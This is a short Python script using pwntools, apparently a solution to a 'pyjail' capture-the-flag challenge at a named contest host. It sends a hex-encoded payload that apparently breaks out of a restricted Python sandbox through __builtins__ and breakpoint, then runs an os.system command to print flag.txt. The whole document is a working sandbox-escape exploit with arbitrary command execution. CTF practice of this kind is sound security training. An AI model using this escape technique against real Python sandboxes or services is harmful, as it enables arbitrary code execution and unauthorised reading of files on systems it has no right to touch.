from pwn import remote 
# nc challs3.pyjail.club 8616
r = remote('challs3.pyjail.club', 8616)

inp = "§§«»¦__builtins__¦breakpoint\n__import__('os').system('cat flag.txt')\n"

r.sendline(inp.encode().hex())
r.interactive()